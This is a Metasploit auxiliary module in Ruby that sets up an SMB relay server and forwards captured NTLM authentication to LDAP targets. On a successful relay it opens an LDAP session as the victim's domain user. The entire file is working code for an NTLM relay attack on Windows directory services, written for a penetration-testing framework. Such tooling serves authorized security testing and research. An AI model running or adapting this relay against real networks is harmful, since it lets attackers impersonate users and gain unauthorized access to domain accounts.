##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include ::Msf::Exploit::Remote::SMB::RelayServer
  include Msf::Auxiliary::CommandShell

  def initialize
    super({
      'Name' => 'Relay: SMB to LDAP',
      'Description' => %q{
      },
      'Author' => [
        'bwatters-r7',
        'Spencer McIntyre'
      ],
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Relay', { 'Description' => 'Run SMB relay server' } ]],
      'PassiveActions' => [ 'Relay' ],
      'DefaultAction' => 'Relay'
    })

    register_options(
      [
        Opt::RPORT(389)
      ]
    )

    register_advanced_options(
      [
        OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true]),
        OptInt.new('SessionKeepalive', [true, 'Time (in seconds) for sending protocol-level keepalive messages', 10 * 60])
      ]
    )

    deregister_options('RHOSTS')
  end

  def relay_targets
    Msf::Exploit::Remote::SMB::Relay::TargetList.new(
      :ldap, # TODO: look into LDAPs
      datastore['RPORT'],
      datastore['RELAY_TARGETS'],
      datastore['TARGETURI'],
      randomize_targets: datastore['RANDOMIZE_TARGETS']
    )
  end

  def check_options
    if datastore['RHOSTS'].present?
      print_warning('Warning: RHOSTS datastore value has been set which is not supported by this module. Please verify RELAY_TARGETS is set correctly.')
    end
  end

  def run
    check_options

    start_service
    print_status('Server started.')

    # Wait on the service to stop
    service.wait if service
  end

  def on_relay_success(relay_connection:, relay_identity:)
    print_good('Relay succeeded')
    # Create a new session
    client = Rex::Proto::LDAP::Client.new(
      host: relay_connection.target.ip,
      port: relay_connection.target.port,
      auth: { method: :rex_relay_ntlm },
      connect_timeout: relay_connection.timeout
    )
    client.connection = relay_connection

    my_session = Msf::Sessions::LDAP.new(relay_connection.socket, { client: client, keepalive_seconds: datastore['SessionKeepalive'] })

    domain, _, username = relay_identity.partition('\\')
    merge_me = {
      'DOMAIN' => domain,
      'USERNAME' => username
    }

    start_session(self, nil, merge_me, false, my_session.rstream, my_session)
  end
end
